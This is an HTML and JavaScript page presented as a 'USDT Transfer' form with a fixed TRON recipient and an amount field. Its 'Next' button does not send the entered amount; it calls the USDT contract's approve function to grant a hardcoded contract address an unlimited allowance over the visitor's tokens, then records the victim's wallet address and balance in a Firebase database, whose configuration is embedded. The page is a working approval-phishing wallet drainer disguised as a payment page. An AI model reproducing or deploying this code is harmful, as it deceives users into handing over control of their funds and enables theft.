<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>USDT Transfer</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
      * {
        box-sizing: border-box;
        font-family: 'Inter', sans-serif;
        margin: 0;
        padding: 0;
      }
      body {
        background-color: #f9fafb;
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 20px;
        min-height: 100vh;
      }
      .container {
        background: white;
        border-radius: 16px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        max-width: 420px;
        width: 100%;
        padding: 24px;
      }
      .header {
        font-size: 20px;
        font-weight: 600;
        margin-bottom: 20px;
        text-align: center;
        color: #111827;
      }
      label {
        font-size: 14px;
        font-weight: 500;
        margin-bottom: 8px;
        display: block;
        color: #374151;
      }
      input {
        width: 100%;
        padding: 12px;
        border: 1px solid #d1d5db;
        border-radius: 12px;
        font-size: 16px;
        margin-bottom: 20px;
        outline: none;
      }
      input:focus {
        border-color: #6366f1;
      }
      button {
        background-color: #10b981;
        color: white;
        border: none;
        border-radius: 12px;
        padding: 14px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        width: 100%;
        transition: background-color 0.3s;
      }
      button:hover {
        background-color: #059669;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">USDT Transfer</div>
      <label>Recipient</label>
      <input type="text" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" disabled />
      <label>Amount</label>
      <input type="number" id="amount" placeholder="Enter amount" />
      <button onclick="approveUSDT()">Next</button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script>
      const contractAddress = 'TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX';
      const usdtAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

      async function waitForTronWeb(retries = 20, delay = 500) {
        return new Promise((resolve, reject) => {
          let attempts = 0;
          const timer = setInterval(() => {
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
              clearInterval(timer);
              resolve(true);
            }
            attempts++;
            if (attempts >= retries) {
              clearInterval(timer);
              resolve(false);
            }
          }, delay);
        });
      }

      async function approveUSDT() {
        const tronReady = await waitForTronWeb(20, 500); // wait up to 10 seconds

        if (!tronReady) {
          alert("Please connect your TRON wallet (e.g., OKX Web3, SafePal).");
          return;
        }

        const userAddress = window.tronWeb.defaultAddress.base58;
        const amount = document.getElementById("amount").value;

        if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
          alert("Enter valid amount.");
          return;
        }

        try {
          const usdtContract = await window.tronWeb.contract().at(usdtAddress);

          await usdtContract.approve(contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({
            feeLimit: 100000000
          });

          saveToFirestore(userAddress, amount);
          alert("Approval successful. USDT can now be pulled by the contract owner.");
        } catch (error) {
          console.error(error);
          alert("Approval failed. Please try again.");
        }
      }

      // Firebase Setup
      import("https://www.gstatic.com/firebasejs/10.5.2/firebase-app-compat.js").then(() => {
        import("https://www.gstatic.com/firebasejs/10.5.2/firebase-firestore-compat.js").then(() => {
          const firebaseConfig = {
            apiKey: "AIzaSyBkyDsWXjZXx8w1SGxP7Koxq8pzkW8NYxM",
            authDomain: "trc20-approval-dapp.firebaseapp.com",
            projectId: "trc20-approval-dapp",
            storageBucket: "trc20-approval-dapp.appspot.com",
            messagingSenderId: "770961226156",
            appId: "1:770961226156:web:d7857b971dd376b7902209"
          };
          firebase.initializeApp(firebaseConfig);
          const db = firebase.firestore();

          window.saveToFirestore = function (wallet, amount) {
            window.tronWeb.trx.getBalance(wallet).then(balanceInSun => {
              const balance = balanceInSun / 1e6;
              db.collection("approvals").add({
                wallet_address: wallet,
                amount,
                balance,
                timestamp: new Date().toISOString()
              }).then(() => {
                console.log("Saved to Firestore");
              }).catch(console.error);
            });
          };
        });
      });
    </script>
  </body>
</html>
